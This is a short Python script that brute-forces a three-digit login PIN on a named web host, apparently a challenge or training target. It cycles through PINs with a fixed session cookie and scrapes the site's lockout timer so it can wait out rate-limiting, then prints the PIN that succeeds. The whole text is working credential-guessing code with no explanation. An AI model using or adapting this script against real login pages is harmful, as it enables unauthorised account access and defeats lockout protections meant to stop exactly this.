import re, requests, sys, time


url = "http://104.cybertrial.co.uk/login"
cookies = {"PHPSESSID": "jdfbbpi23j5vci13dn5chigr02"}
timeout = 11
sess = requests.session()

for pin in range(800,900):
    payload = {"formgo": "1",
               "pin": "{0:0=3d}".format(pin)
    }
    resp = sess.post(url, data=payload, cookies=cookies)

    while resp.status_code == 403:
        timeout = re.findall("0000;'>([0-9]*)<\/span", resp.text)[0]
        print("timeout, waiting {} seconds".format(timeout))
        time.sleep(int(timeout) + 1)
        resp = sess.post(url, data=payload, cookies=cookies)
        
    check = re.search("Your pin is incorrect", resp.text)
    if check:
        print("incorrect pin:", "{0:0=3d}".format(pin))
    else:
        print("the pin is:", str(pin))
        break
